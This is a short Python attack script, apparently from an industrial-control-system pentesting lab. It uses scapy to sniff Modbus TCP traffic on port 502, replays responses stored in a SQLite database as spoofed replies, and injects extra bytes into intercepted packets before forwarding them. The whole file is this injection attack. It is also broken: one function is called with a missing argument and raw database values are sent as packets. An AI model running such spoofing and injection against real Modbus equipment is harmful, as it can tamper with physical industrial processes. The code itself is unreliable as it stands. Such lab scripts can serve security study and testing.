import sqlite3
from scapy.all import *

# Connect with sqlite database
conn = sqlite3.connect('/home/kali/ICSPentesting/ICSPentesting/Attack/modbus_data.db')
c = conn.cursor()

# Get Modbus response from database
def get_modbus_response(transaction_id, client_id, function_code):
    packet_type = "Response"
    c.execute("SELECT * FROM modbus_data WHERE packet_type=? AND Transaction_Identifier=? AND Unit_Identifier=? AND Function_Code=?", (packet_type, transaction_id, client_id, function_code))
    response = c.fetchone()
    if response:
        return response[0]
    else:
        return None

# Function to inject data into Modbus packages 
def inject_data(pkt):
    pkt[TCP].load += b'\x00\x01\x02\x03' 
    
    return pkt

# Sniffing and injection
def sniff_and_inject(iface):
    def process_packet(pkt):
        if TCP in pkt and pkt[TCP].dport == 502: 
            # Check if the TCP packet has payload
            if Raw in pkt:
                # Extract transaction_id and client_id from the TCP payload
                payload = pkt[TCP].load
                transaction_id = payload[:2].hex()
                print("Transation_Identifier: ", transaction_id)
                client_id = payload[6:7].hex()
                print("Client_Identifier: ", client_id)
                
                # Query database to get Modbus response 
                response = get_modbus_response(transaction_id, client_id)
                if response:
                    # Print Modbus response
                    print("Modbus response:", response)

                    # Send response to client
                    sendp(response, iface=iface)
                
                    # Inject data into the packet
                    pkt = inject_data(pkt)
                    
                    # Send modified packet to the server
                    sendp(pkt, iface=iface)

    sniff(iface=iface, prn=process_packet)

sniff_and_inject('lo')



